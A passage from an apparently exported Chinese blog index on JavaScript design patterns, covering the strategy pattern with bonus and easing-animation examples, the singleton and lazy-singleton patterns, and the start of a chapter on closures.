'B', 20000 ); // 输 出： 40000 calculateBonus( 'S', 6000 ); // 输 出： 24000 可以发现，这段代码十分简单，但是存在着显而易见的缺点。 calculateBonus函数比较庞大，包含了很多if-else语句，这些语句需要覆盖所有的逻辑分支。 calculateBonus函数缺乏弹性，如果增加了一种新的绩效等级C，或者想把绩效S的奖金系数改为5，那我们必须深入calculateBonus函数的内部实现，这是违反开放-封闭原则的。 算法的复用性差，如果在程序的其他地方需要重用这些计算奖金的算法呢？我们的选择只有复制和粘贴。因此，我们需要重构这段代码。 2.使用组合函数重构代码一般最容易想到的办法就是使用组合函数来重构代码，我们把各种算法封装到一个个的小函数里面，这些小函数有着良好的命名，可以一目了然地知道它对应着哪种算法，它们也可以被复用在程序的其他地方。代码如下：1234567891011var performanceS = function( salary )&#123; return salary * 4; &#125;; var performanceA = function( salary )&#123; return salary * 3; &#125;; var performanceB = function( salary )&#123; return salary * 2; &#125;; var calculateBonus = function( performanceLevel, salary )&#123; if ( performanceLevel === 'S' )&#123; return performanceS( salary ); &#125; if ( performanceLevel === 'A' )&#123; return performanceA( salary ); &#125; if ( performanceLevel === 'B' )&#123; return performanceB( salary ); &#125;&#125;; calculateBonus( 'A' , 10000 ); // 输 出： 30000 目前，我们的程序得到了一定的改善，但这种改善非常有限，我们依然没有解决最重要的问题：calculateBonus函数有可能越来越庞大，而且在系统变化的时候缺乏弹性。 3.使用策略模式重构代码 经过思考，我们想到了更好的办法——使用策略模式来重构代码。策略模式指的是定义一系列的算法，把它们一个个封装起来。将不变的部分和变化的部分隔开是每个设计模式的主题，策略模式也不例外，策略模式的目的就是将算法的使用与算法的实现分离开来。在这个例子里，算法的使用方式是不变的，都是根据某个算法取得计算后的奖金数额。而算法的实现是各异和变化的，每种绩效对应着不同的计算规则。 一个基于策略模式的程序至少由两部分组成。第一个部分是一组策略类，策略类封装了具体的算法，并负责具体的计算过程。第二个部分是环境类Context，Context接受客户的请求，随后把请求委托给某一个策略类。要做到这点，说明Context中要维持对某个策略对象的引用。现在用策略模式来重构上面的代码。第一个版本是模仿传统面向对象语言中的实现。我们先把每种绩效的计算规则都封装在对应的策略类里面：123456789101112131415161718192021222324var performanceS = function()&#123;&#125;; performanceS.prototype.calculate = function( salary )&#123; return salary * 4; &#125;; var performanceA = function()&#123;&#125;; performanceA.prototype.calculate = function( salary )&#123; return salary * 3; &#125;; var performanceB = function()&#123;&#125;; performanceB.prototype.calculate = function( salary )&#123; return salary * 2; &#125;;// 接 下 来 定 义 奖 金 类 Bonus：var Bonus = function()&#123; this.salary = null; // 原 始 工 资 this.strategy = null; // 绩 效 等 级 对 应 的 策 略 对 象 &#125;; Bonus.prototype.setSalary = function( salary )&#123; this.salary = salary; // 设 置 员 工 的 原 始 工 资 &#125;; Bonus.prototype.setStrategy = function( strategy )&#123; this.strategy = strategy; // 设 置 员 工 绩 效 等 级 对 应 的 策 略 对 象 &#125;; Bonus.prototype.getBonus = function()&#123; // 取 得 奖 金 数 额 return this.strategy.calculate( this.salary ); // 把 计 算 奖 金 的 操 作 委 托 给 对 应 的 策 略 对 象 &#125;; 在完成最终的代码之前，我们再来回顾一下策略模式的思想：定义一系列的算法，把它们各自封装成策略类，算法被封装在策略类内部的方法里。在客户对Context发起请求的时候，Context总是把请求委托给这些策略对象中间的某一个进行计算。现在我们来完成这个例子中剩下的代码。先创建一个bonus对象，并且给bonus对象设置一些原始的数据，比如员工的原始工资数额。接下来把某个计算奖金的策略对象也传入bonus对象内部保存起来。当调用bonus.getBonus()来计算奖金的时候，bonus对象本身并没有能力进行计算，而是把请求委托给了之前保存好的策略对象：12345678var bonus = new Bonus(); bonus.setSalary( 10000 ); bonus.setStrategy( new performanceS() ); // 设置 策 略 对 象 console.log( bonus.getBonus() ); // 输 出： 40000 bonus.setStrategy( new performanceA() ); // 设 置 策 略 对 象 console.log( bonus.getBonus() ); // 输 出： 30000 刚刚我们用策略模式重构了这段计算年终奖的代码，可以看到通过策略模式重构之后，代码变得更加清晰，各个类的职责更加鲜明。但这段代码是基于传统面向对象语言的模仿，下一节我们将了解用JavaScript实现的策略模式。 JavaScript版本的策略模式我们让strategy对象从各个策略类中创建而来，这是模拟一些传统面向对象语言的实现。实际上在JavaScript语言中，函数也是对象，所以更简单和直接的做法是把strategy直接定义为函数：同样，Context也没有必要必须用Bonus类来表示，我们依然用calculateBonus函数充当Context来接受用户的请求。经过改造，代码的结构变得更加简洁：1234567891011var strategies = &#123; \"S\": function( salary )&#123; return salary * 4; &#125;, \"A\": function( salary )&#123; return salary * 3; &#125;, \"B\": function( salary )&#123; return salary * 2; &#125; &#125;;var calculateBonus = function( level, salary )&#123; return strategies[ level ]( salary ); &#125;; console.log( calculateBonus( 'S', 20000 ) ); // 输 出： 80000 console.log( calculateBonus( 'A', 10000 ) ); // 输 出： 30000 通过使用策略模式重构代码，我们消除了原程序中大片的条件分支语句。所有跟计算奖金有关的逻辑不再放在Context中，而是分布在各个策略对象中。Context并没有计算奖金的能力，而是把这个职责委托给了某个策略对象。每个策略对象负责的算法已被各自封装在对象内部。当我们对这些策略对象发出“计算奖金”的请求时，它们会返回各自不同的计算结果，这正是对象多态性的体现，也是“它们可以相互替换”的目的。替换Context中当前保存的策略对象，便能执行不同的算法来得到我们想要的结果。 使用策略模式实现缓动动画我们目标是编写一个动画类和一些缓动算法，让小球以各种各样的缓动效果在页面中运动。现在来分析实现这个程序的思路。在运动开始之前，需要提前记录一些有用的信息，至少包括以下信息： 动画开始时，小球所在的原始位置； 小球移动的目标位置； 动画开始时的准确时间点； 小球运动持续的时间。 随后，我们会用setInterval创建一个定时器，定时器每隔19ms循环一次。在定时器的每一帧里，我们会把动画已消耗的时间、小球原始位置、小球目标位置和动画持续的总时间等信息传入缓动算法。该算法会通过这几个参数，计算出小球当前应该所在的位置。最后再更新该div对应的CSS属性，小球就能够顺利地运动起来了。在实现完整的功能之前，我们先了解一些常见的缓动算法，这些算法最初来自Flash，但可以非常方便地移植到其他语言中。这些算法都接受4个参数，这4个参数的含义分别是动画已消耗的时间、小球原始位置、小球目标位置、动画持续的总时间，返回的值则是动画元素应该处在的当前位置。代码如下：12345678var tween = &#123; linear: function( t, b, c, d )&#123; return c* t/ d + b; &#125;, easeIn: function( t, b, c, d )&#123; return c * ( t /= d ) * t + b; &#125;, strongEaseIn: function( t, b, c, d)&#123; return c * ( t /= d ) * t * t * t * t + b; &#125;, strongEaseOut: function( t, b, c, d)&#123; return c * ( ( t = t / d - 1) * t * t * t * t + 1 ) + b; &#125;, sineaseIn: function( t, b, c, d )&#123; return c * ( t /= d) * t * t + b; &#125;, sineaseOut: function( t, b, c, d)&#123;return c * ( ( t = t / d - 1) * t * t + 1 ) + b; &#125; &#125;; 接下来定义Animate类，Animate的构造函数接受一个参数：即将运动起来的dom节点。Animate类的代码如下：123456789var Animate = function( dom )&#123; this.dom = dom; // 进 行 运 动 的 dom 节 点 this.startTime = 0; // 动 画 开 始 时 间 this.startPos = 0; // 动 画 开 始 时， dom 节 点 的 位 置， 即 dom 的 初 始 位 置 this.endPos = 0; // 动 画 结 束 时， dom 节 点 的 位 置， 即 dom 的 目 标 位 置 this.propertyName = null; // dom 节 点 需 要 被 改 变 的 css 属 性 名 this.easing = null; // 缓 动 算 法 this.duration = null; // 动 画 持 续 时 间 &#125;; 接下来Animate.prototype.start方法负责启动这个动画，在动画被启动的瞬间，要记录一些信息，供缓动算法在以后计算小球当前位置的时候使用。在记录完这些信息之后，此方法还要负责启动定时器。代码如下：1234567891011121314Animate.prototype.start = function( propertyName, endPos, duration, easing )&#123; this.startTime =+ new Date; // 动 画 启 动 时 间 this.startPos = this.dom.getBoundingClientRect()[ propertyName ]; // dom 节 点 初 始 位 置 this.propertyName = propertyName; // dom 节 点 需 要 被 改 变 的 CSS 属 性 名 this.endPos = endPos; // dom 节 点 目 标 位 置 this.duration = duration; // 动 画 持 续 事 件 this.easing = tween[ easing ]; // 缓 动 算 法 var self = this; var timeId = setInterval( function()&#123; // 启 动 定 时 器， 开 始 执 行 动 画 if ( self.step() === false )&#123; // 如 果 动 画 已 结 束， 则 清 除 定 时 器 clearInterval( timeId ); &#125; &#125;, 19 ); &#125;; 再接下来是Animate.prototype.step方法，该方法代表小球运动的每一帧要做的事情。在此处，这个方法负责计算小球的当前位置和调用更新CSS属性值的方法Animate.prototype.update。代码如下：123456789Animate.prototype.step = function()&#123; var t = + new Date; // 取 得 当 前 时 间 if ( t &gt; = this.startTime + this.duration )&#123; // (1) this.update( this.endPos ); // 更 新 小 球 的 CSS 属 性 值 return false; &#125; var pos = this.easing( t - this.startTime, this.startPos, this.endPos - this.startPos, this.duration ); // pos 为 小 球 当 前 位 置 this.update( pos ); // 更 新 小 球 的 CSS 属 性 值 &#125;; 在这段代码中，(1)处的意思是，如果当前时间大于动画开始时间加上动画持续时间之和，说明动画已经结束，此时要修正小球的位置。因为在这一帧开始之后，小球的位置已经接近了目标位置，但很可能不完全等于目标位置。此时我们要主动修正小球的当前位置为最终的目标位置。此外让Animate.prototype.step方法返回false，可以通知Animate.prototype.start方法清除定时器。最后是负责更新小球CSS属性值的Animate.prototype.update方法：1Animate.prototype.update = function( pos )&#123; this.dom.style[ this.propertyName ] = pos + 'px'; &#125;; 测试如下：123var div = document.getElementById( 'div' ); var animate = new Animate( div ); animate.start('left',500,1000,'strongEaseOut');//animate.start('top',1500,500,'strongEaseIn'); 通过这段代码，可以看到小球按照我们的期望以各种各样的缓动算法在页面中运动。本节我们学会了怎样编写一个动画类，利用这个动画类和一些缓动算法就可以让小球运动起来。我们使用策略模式把算法传入动画类中，来达到各种不同的缓动效果，这些算法都可以轻易地被替换为另外一个算法，这是策略模式的经典运用之一。策略模式的实现并不复杂，关键是如何从策略模式的实现背后，找到封装变化、委托和多态性这些思想的价值。 策略模式指的是定义一系列的算法，并且把它们封装起来。本章我们介绍的计算奖金和缓动动画的例子都封装了一些算法。从定义上看，策略模式就是用来封装算法的。但如果把策略模式仅仅用来封装算法，未免有一点大材小用。在实际开发中，我们通常会把算法的含义扩散开来，使策略模式也可以用来封装一系列的“业务规则”。只要这些业务规则指向的目标一致，并且可以被替换使用，我们就可以用策略模式来封装它们。 GoF在《设计模式》一书中提到了一个利用策略模式来校验用户是否输入了合法数据的例子，但GoF未给出具体的实现。刚好在Web开发中，表单校验是一个非常常见的话题。 策略模式的优缺点我们可以总结出策略模式的一些优点。 策略模式利用组合、委托和多态等技术和思想，可以有效地避免多重条件选择语句。 策略模式提供了对开放—封闭原则的完美支持，将算法封装在独立的strategy中，使得它们易于切换，易于理解，易于扩展。 策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作。 在策略模式中利用组合和委托来让Context拥有执行算法的能力，这也是继承的一种更轻便的替代方案。 当然，策略模式也有一些缺点，但这些缺点并不严重。 首先，使用策略模式会在程序中增加许多策略类或者策略对象，但实际上这比把它们负责的逻辑堆砌在Context中要好。 其次，要使用策略模式，必须了解所有的strategy，必须了解各个strategy之间的不同点，这样才能选择一个合适的strategy。比如，我们要选择一种合适的旅游出行路线，必须先了解选择飞机、火车、自行车等方案的细节。此时strategy要向客户暴露它的所有实现，这是违反最少知识原则的。 一等函数对象与策略模式本章提供的几个策略模式示例，既有模拟传统面向对象语言的版本，也有针对JavaScript语言的特有实现。在以类为中心的传统面向对象语言中，不同的算法或者行为被封装在各个策略类中，Context将请求委托给这些策略对象，这些策略对象会根据请求返回不同的执行结果，这样便能表现出对象的多态性。PeterNorvig在他的演讲中曾说过：“在函数作为一等对象的语言中，策略模式是隐形的。strategy就是值为函数的变量。”在JavaScript中，除了使用类来封装算法和行为之外，使用函数当然也是一种选择。这些“算法”可以被封装到函数中并且四处传递，也就是我们常说的“高阶函数”。实际上在JavaScript这种将函数作为一等对象的语言里，策略模式已经融入到了语言本身当中，我们经常用高阶函数来封装不同的行为，并且把它传递到另一个函数中。当我们对这些函数发出“调用”的消息时，不同的函数会返回不同的执行结果。在JavaScript中，“函数对象的多态性”来得更加简单。在前面的学习中，为了清楚地表示这是一个策略模式，我们特意使用了strategies这个名字。如果去掉strategies，我们还能认出这是一个策略模式的实现吗？代码如下：123456var S = function( salary )&#123; return salary * 4; &#125;; var A = function( salary )&#123; return salary * 3; &#125;; var B = function( salary )&#123; return salary * 2; &#125;; var calculateBonus = function( func, salary )&#123; return func( salary ); &#125;; calculateBonus( S, 10000 ); // 输 出： 40000 小结本章我们既提供了接近传统面向对象语言的策略模式实现，也提供了更适合JavaScript语言的策略模式版本。在JavaScript语言的策略模式中，策略类往往被函数所代替，这时策略模式就成为一种“隐形”的模式。尽管这样，从头到尾地了解策略模式，不仅可以让我们对该模式有更加透彻的了解，也可以使我们明白使用函数的好处。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-3-单例模式","slug":"js-pattern3","date":"2017-11-05T15:23:33.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/05/js-pattern3/","link":"","permalink":"https://github.com/xmoyKING/2017/11/05/js-pattern3/","excerpt":"","text":"单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点。 单例模式是一种常用的模式，有一些对象我们往往只需要一个，比如线程池、全局缓存、浏览器中的window对象等。在JavaScript开发中，单例模式的用途同样非常广泛。试想一下，当我们单击登录按钮的时候，页面中会出现一个登录浮窗，而这个登录浮窗是唯一的，无论单击多少次登录按钮，这个浮窗都只会被创建一次，那么这个登录浮窗就适合用单例模式来创建。 实现单例模式要实现一个标准的单例模式并不复杂，无非是用一个变量来标志当前是否已经为某个类创建过对象，如果是，则在下一次获取该类的实例时，直接返回之前创建的对象。12345678910111213141516171819var Singleton = function(name)&#123; this.name = name; this.instance = null;&#125;Singleton.prototype.getName = function()&#123; alert(this.name);&#125;Singleton.getInstance = function(name)&#123; if(!this.instance)&#123; this.instance = new Singleton(name); &#125; return this.instance;&#125;;var a = Singleton.getInstance('val');var b = Singleton.getInstance('va2');alert( a === b); // true 第二种写法：1234567891011var Singleton = function( name )&#123; this.name = name; &#125;; Singleton.prototype.getName = function()&#123; alert ( this.name ); &#125;; Singleton.getInstance = (function()&#123; var instance = null; return function( name )&#123; if ( !instance )&#123; instance = new Singleton( name ); &#125; return instance;&#125; &#125;)(); 我们通过Singleton.getInstance来获取Singleton类的唯一对象，这种方式相对简单，但有一个问题，就是增加了这个类的“不透明性”，Singleton类的使用者必须知道这是一个单例类，跟以往通过newXXX的方式来获取对象不同，这里偏要使用Singleton.getInstance来获取对象。 透明的单例模式现在的目标是实现一个“透明”的单例类，用户从这个类中创建对象的时候，可以像使用其他任何普通类一样。在下面的例子中，使用CreateDiv单例类，它的作用是负责在页面中创建唯一的div节点，代码如下：1234567891011121314151617181920212223var CreateDiv = (function()&#123; var instance; var CreateDiv = function(html)&#123; if(instance)&#123; return instance; &#125; this.html = html; this.init(); return instance = this; &#125;; CreateDiv.prototype.init = function()&#123; var div = document.createElement('div'); div.innerHTML = this.html; document.body.appendChild(div); &#125; return CreateDiv;&#125;)()var a = new CreateDiv('sev1');var b = new CreateDiv('sev2');alert(a === b); // true 虽然现在完成了一个透明的单例类的编写，但它同样有一些缺点。为了把instance封装起来，我们使用了自执行的匿名函数和闭包，并且让这个匿名函数返回真正的Singleton构造方法，这增加了一些程序的复杂度，阅读起来也不是很舒服。 在这段代码中，CreateDiv的构造函数实际上负责了两件事情。第一是创建对象和执行初始化init方法，第二是保证只有一个对象。虽然我们目前还没有接触过“单一职责原则”的概念，但可以明确的是，这是一种不好的做法，至少这个构造函数看起来很奇怪。 假设我们某天需要利用这个类，在页面中创建千千万万的div，即要让这个类从单例类变成一个普通的可产生多个实例的类，那我们必须得改写CreateDiv构造函数，把控制创建唯一对象的那一段去掉，这种修改会给我们带来不必要的烦恼。 用代理实现单例模式现在我们通过引入代理类的方式，来解决上面提到的问题。首先在CreateDiv构造函数中，把负责管理单例的代码移除出去，使它成为一个普通的创建div的类：12345678910var CreateDiv = function( html )&#123; this.html = html; this.init(); &#125;; CreateDiv.prototype.init = function()&#123; var div = document.createElement( 'div' ); div.innerHTML = this.html; document.body.appendChild( div ); &#125;; 接下来引入代理类proxySingletonCreateDiv：123456789101112var ProxySingletonCreateDiv = (function()&#123; var instance; return function( html )&#123; if ( !instance )&#123; instance = new CreateDiv( html ); &#125; return instance; &#125; &#125;)(); var a = new ProxySingletonCreateDiv( 'sven1' ); var b = new ProxySingletonCreateDiv( 'sven2' ); alert ( a === b ); 通过引入代理类的方式，我们同样完成了一个单例模式的编写，跟之前不同的是，现在我们把负责管理单例的逻辑移到了代理类proxySingletonCreateDiv中。这样一来，CreateDiv就变成了一个普通的类，它跟proxySingletonCreateDiv组合起来可以达到单例模式的效果。本例是缓存代理的应用之一. JavaScript中的单例模式前面提到的几种单例模式的实现，更多的是接近传统面向对象语言中的实现，单例对象从“类”中创建而来。在以类为中心的语言中，这是很自然的做法。比如在Java中，如果需要某个对象，就必须先定义一个类，对象总是从类中创建而来的。 但JavaScript其实是一门无类（class-free）语言，也正因为如此，生搬单例模式的概念并无意义。在JavaScript中创建对象的方法非常简单，既然我们只需要一个“唯一”的对象，为什么要为它先创建一个“类”呢？这无异于穿棉衣洗澡，传统的单例模式实现在JavaScript中并不适用。 单例模式的核心是确保只有一个实例，并提供全局访问。全局变量不是单例模式，但在JavaScript开发中，我们经常会把全局变量当成单例来使用。例如：1var a = &#123;&#125;; 当用这种方式创建对象a时，对象a确实是独一无二的。如果a变量被声明在全局作用域下，则我们可以在代码中的任何位置使用这个变量，全局变量提供给全局访问是理所当然的。这样就满足了单例模式的两个条件。但是全局变量存在很多问题，它很容易造成命名空间污染。在大中型项目中，如果不加以限制和管理，程序中可能存在很多这样的变量。JavaScript中的变量也很容易被不小心覆盖. 我们有必要尽量减少全局变量的使用，即使需要，也要把它的污染降到最低。以下几种方式可以相对降低全局变量带来的命名污染。1.使用命名空间适当地使用命名空间，并不会杜绝全局变量，但可以减少全局变量的数量。最简单的方法依然是用对象字面量的方式：1234var namespace1 = &#123; a: function()&#123; alert (1); &#125;, b: function()&#123; alert (2); &#125; &#125;; 把a和b都定义为namespace1的属性，这样可以减少变量和全局作用域打交道的机会。另外我们还可以动态地创建命名空间，代码如下：12345678910111213141516var MyApp = &#123;&#125;; MyApp.namespace = function( name )&#123; var parts = name.split( '.' ); var current = MyApp; for ( var i in parts )&#123; if ( !current[ parts[ i ] ] )&#123; current[ parts[ i ] ] = &#123;&#125;; &#125; current = current[ parts[ i ] ]; &#125; &#125;; MyApp.namespace( 'event' ); MyApp.namespace( 'dom.style' ); console.dir( MyApp ); // 上 述 代 码 等 价 于： var MyApp = &#123; event: &#123;&#125;, dom: &#123; style: &#123;&#125; &#125; &#125;; 2.使用闭包封装私有变量这种方法把一些变量封装在闭包的内部，只暴露一些接口跟外界通信：123456789var user = (function()&#123; var __name = 'sven', __age = 29; return &#123; getUserInfo: function()&#123; return __name + '-' + __age; &#125; &#125; &#125;)(); 用下划线来约定私有变量__name和__age，它们被封装在闭包产生的作用域中，外部是访问不到这两个变量的，这就避免了对全局的命令污染。 惰性单例惰性单例指的是在需要的时候才创建对象实例。惰性单例是单例模式的重点，这种技术在实际开发中非常有用，有用的程度可能超出了我们的想象，实际上在开头就使用过这种技术，instance实例对象总是在我们调用Singleton.getInstance的时候才被创建，而不是在页面加载好的时候就创建，不过这是基于“类”的单例模式，前面说过，基于“类”的单例模式在JavaScript中并不适用，下面我们将以WebQQ的登录浮窗为例，介绍与全局变量结合实现惰性的单例。 假设我们是WebQQ的开发人员（网址是web.qq.com），当点击左边导航里QQ头像时，会弹出一个登录浮窗，很明显这个浮窗在页面里总是唯一的，不可能出现同时存在两个登录窗口的情况。 第一种解决方案是在页面加载完成的时候便创建好这个div浮窗，这个浮窗一开始肯定是隐藏状态的，当用户点击登录按钮的时候，它才开始显示：这种方式有一个问题，也许我们进入WebQQ只是玩玩游戏或者看看天气，根本不需要进行登录操作，因为登录浮窗总是一开始就被创建好，那么很有可能将白白浪费一些DOM节点。可以用一个变量来判断是否已经创建过登录浮窗，这也是本节第一段代码中的做法。12345678910111213141516var createLoginLayer = (function()&#123; var div; return function()&#123; if ( !div )&#123; div = document.createElement( 'div' ); div.innerHTML = '我 是 登 录 浮 窗'; div.style.display = 'none'; document.body.appendChild( div ); &#125; return div; &#125; &#125;)(); document.getElementById( 'loginBtn' ).onclick = function()&#123; var loginLayer = createLoginLayer(); loginLayer.style.display = 'block'; &#125;; 一个可用的惰性单例，但是我们发现它还有如下一些问题。 这段代码仍然是违反单一职责原则的，创建对象和管理单例的逻辑都放在createLoginLayer对象内部。 如果我们下次需要创建页面中唯一的iframe，或者script标签，用来跨域请求数据，就必须得如法炮制，把createLoginLayer函数几乎照抄一遍： 我们需要把不变的部分隔离出来，先不考虑创建一个div和创建一个iframe有多少差异，管理单例的逻辑其实是完全可以抽象出来的，这个逻辑始终是一样的：用一个变量来标志是否创建过对象，如果是，则在下次直接返回这个已经创建好的对象：1var obj; if ( !obj )&#123; obj = xxx; &#125; 现在我们就把如何管理单例的逻辑从原来的代码中抽离出来，这些逻辑被封装在getSingle函数内部，创建对象的方法fn被当成参数动态传入getSingle函数：123456var getSingle = function( fn )&#123; var result; return function()&#123; return result | | ( result = fn.apply( this, arguments ) ); &#125;&#125;; 接下来将用于创建登录浮窗的方法用参数fn的形式传入getSingle，我们不仅可以传入createLoginLayer，还能传入createScript、createIframe、createXhr等。之后再让getSingle返回一个新的函数，并且用一个变量result来保存fn的计算结果。result变量因为身在闭包中，它永远不会被销毁。在将来的请求中，如果result已经被赋值，那么它将返回这个值。代码如下：12345678910111213var createLoginLayer = function()&#123; var div = document.createElement( 'div' ); div.innerHTML = '我 是 登 录 浮 窗'; div.style.display = 'none'; document.body.appendChild( div ); return div; &#125;; var createSingleLoginLayer = getSingle( createLoginLayer ); document.getElementById( 'loginBtn' ).onclick = function()&#123; var loginLayer = createSingleLoginLayer(); loginLayer.style.display = 'block'; &#125;; 在这个例子中，我们把创建实例对象的职责和管理单例的职责分别放置在两个方法里，这两个方法可以独立变化而互不影响，当它们连接在一起的时候，就完成了创建唯一实例对象的功能，看起来是一件挺奇妙的事情。 这种单例模式的用途远不止创建对象，比如我们通常渲染完页面中的一个列表之后，接下来要给这个列表绑定click事件，如果是通过ajax动态往列表里追加数据，在使用事件代理的前提下，click事件实际上只需要在第一次渲染列表的时候被绑定一次，但是我们不想去判断当前是否是第一次渲染列表，如果借助于jQuery，我们通常选择给节点绑定one事件：12345678910111213var bindEvent = function()&#123; $( 'div' ).one( 'click', function()&#123; alert ( 'click' ); &#125;);&#125;; var render = function()&#123; console.log( '开 始 渲 染 列 表' ); bindEvent(); &#125;; render(); render(); render(); 如果利用getSingle函数，也能达到一样的效果。代码如下： 123456789101112131415var bindEvent = getSingle( function()&#123; document.getElementById( 'div1' ).onclick = function()&#123; alert ( 'click' ); &#125; return true; &#125;); var render = function()&#123; console.log( '开 始 渲 染 列 表' ); bindEvent(); &#125;; render(); render(); render(); render函数和bindEvent函数都分别执行了3次，但div实际上只被绑定了一个事件。 小结单例模式是我们学习的第一个模式，我们先学习了传统的单例模式实现，也了解到因为语言的差异性，有更适合的方法在JavaScript中创建单例。这一章还提到了代理模式和单一职责原则，后面的章节会对它们进行更详细的讲解。在getSinge函数中，实际上也提到了闭包和高阶函数的概念。单例模式是一种简单但非常实用的模式，特别是惰性单例技术，在合适的时候才创建对象，并且只创建唯一的一个。更奇妙的是，创建对象和管理单例的职责被分布在两个不同的方法中，这两个方法组合起来才具有单例模式的威力。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-2-基础复习-闭包和高阶函数","slug":"js-pattern2","date":"2017-11-03T12:15:13.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/03/js-pattern2/","link":"","permalink":"https://github.com/xmoyKING/2017/11/03/js-pattern2/","excerpt":"","text":"虽然JavaScript是一门完整的面向对象的编程语言，但这门语言同时也拥有许多函数式语言的特性。 函数式语言的鼻祖是LISP，JavaScript在设计之初参考了LISP两大方言之一的Scheme，引入了Lambda表达式、闭包、高阶函数等特性。使用这些特性，可以用一些灵活而巧妙的方式来编写JavaScript代码。 闭包对于JavaScript程序员来说，闭包（closure）是一个难懂又必须征服的概念。闭包的形成与变量的作用域以及变量的生存周期密切相关。 变量的作用域变量的作用域，就是指变量的有效范围。最常谈到的是在函数中声明的变量作用域。当在函数中声明一个变量的时候，如果该变量前面没有带上关键字var，这个变量就会成为全局变量，这当然是一种容易造成命名冲突的做法。另外一种情况是用var关键字在函数中声明变量，这时候的变量即是局部变量，只有在该函数内部才能访问到这个变量，在函数外面是访问不到的。代码如下：123456var func = function() &#123; var a = 1; alert(a); // 输 出: 1 &#125;;func();alert(a); // 输 出： Uncaught ReferenceError: a is not defined 在JavaScript中，函数可以用来创造函数作用域。此时的函数像一层半透明的玻璃，在函数里面可以看到外面的变量，而在函数外面则无法看到函数里面的变量。这是因为当在函数中搜索一个变量的时候，如果该函数内并没有声明这个变量，那么此次搜索的过程会随着代码执行环境创建的作用域链往外层逐层搜索，一直搜索到全局对象为止。变量的搜索是从内到外而非从外到内的。 下面这段包含了嵌套函数的代码，也许能帮助加深对变量搜索过程的理解：123456789101112var a = 1;var func1 = function() &#123; var b = 2; var func2 = function() &#123; var c = 3; alert(b); // 输 出： 2 alert(a); // 输 出： 1 &#125; func2(); alert(c); // 输 出： Uncaught ReferenceError: c is not defined &#125;;func1(); 变量的生存周期除了变量的作用域之外，另外一个跟闭包有关的概念是变量的生存周期。 对于全局变量来说，全局变量的生存周期当然是永久的，除非主动销毁这个全局变量。 而对于在函数内用var关键字声明的局部变量来说，当退出函数时，这些局部变量即失去了它们的价值，它们都会随着函数调用的结束而被销毁。123456789101112var func = function() &#123; var a = 1; return function() &#123; a++; alert(a); &#125; &#125;;var f = func();f(); // 输 出： 2f(); // 输 出： 3 f(); // 输 出： 4f(); // 输 出： 5 当退出函数后，局部变量a并没有消失，而是似乎一直在某个地方存活着。这是因为当执行var f=func();时，f返回了一个匿名函数的引用，它可以访问到func()被调用时产生的环境，而局部变量a一直处在这个环境里。既然局部变量所在的环境还能被外界访问，这个局部变量就有了不被销毁的理由。在这里产生了一个闭包结构，局部变量的生命看起来被延续了。 利用闭包可以完成许多奇妙的工作，下面介绍一个闭包的经典应用。 假设页面上有5个div节点，通过循环来给每个div绑定onclick事件，按照索引顺序，点击第1个div时弹出0，点击第2个div时弹出1，以此类推。代码如下：123456var nodes = document.getElementsByTagName('div');for (var i = 0, len = nodes.length; i &lt; len; i++) &#123; nodes[i].onclick = function() &#123; alert(i); &#125;&#125;; 无论点击哪个div，最后弹出的结果都是5。这是因为div节点的onclick事件是被异步触发的，当事件被触发的时候，for循环早已结束，此时变量i的值已经是5，所以在div的onclick事件函数中顺着作用域链从内到外查找变量i时，查找到的值总是5。 解决方法是在闭包的帮助下，把每次循环的i值都封闭起来。当在事件函数中顺着作用域链中从内到外查找变量i时，会先找到被封闭在闭包环境中的i，如果有5个div，这里的i就分别是0,1,2,3,4：1234567for (var i = 0, len = nodes.length; i &lt; len; i++) &#123; (function(i) &#123; nodes[i].onclick = function() &#123; console.log(i); &#125; &#125;)(i)&#125;; 同样：123456789var Type = &#123;&#125;;for (var i = 0, type; type = ['String', 'Array', 'Number'][i++];) &#123; (function(type) &#123; Type['is' + type] = function(obj) &#123; return Object.prototype.toString.call(obj) === '[ object ' + type + ']'; &#125; &#125;)(type)&#125;;Type.isArray([]); // 输 出： true Type.isString( \"str\" ); // 输 出： true 闭包的更多作用在实际开发中，闭包的运用非常广泛。 1.封装变量闭包可以帮助把一些不需要暴露在全局的变量封装成“私有变量”。假设有一个计算乘积的简单函数：1234567var mult = function() &#123; var a = 1; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; a = a * arguments[i]; &#125; return a; &#125;; mult函数接受一些number类型的参数，并返回这些参数的乘积。现在觉得对于那些相同的参数来说，每次都进行计算是一种浪费，可以加入缓存机制来提高这个函数的性能：1234567891011121314var cache = &#123;&#125;;var mult = function() &#123; var args = Array.prototype.join.call(arguments, ','); if (cache[args]) &#123; return cache[args]; &#125; var a = 1; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; a = a * arguments[i]; &#125; return cache[args] = a; &#125;;alert(mult(1, 2, 3)); // 输 出： 6alert(mult(1, 2, 3)); // 输 出： 6 看到cache这个变量仅仅在mult函数中被使用，与其让cache变量跟mult函数一起平行地暴露在全局作用域下，不如把它封闭在mult函数内部，这样可以减少页面中的全局变量，以避免这个变量在其他地方被不小心修改而引发错误。代码如下：1234567891011121314var mult = (function() &#123; var cache = &#123;&#125;; return function() &#123; var args = Array.prototype.join.call(arguments, ','); if (args in cache) &#123; return cache[args]; &#125; var a = 1; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; a = a * arguments[i]; &#125; return cache[args] = a; &#125;&#125;)(); 提炼函数是代码重构中的一种常见技巧。如果在一个大函数中有一些代码块能够独立出来，常常把这些代码块封装在独立的小函数里面。独立出来的小函数有助于代码复用，如果这些小函数有一个良好的命名，它们本身也起到了注释的作用。如果这些小函数不需要在程序的其他地方使用，最好是把它们用闭包封闭起来。代码如下：1234567891011121314151617var mult = (function() &#123; var cache = 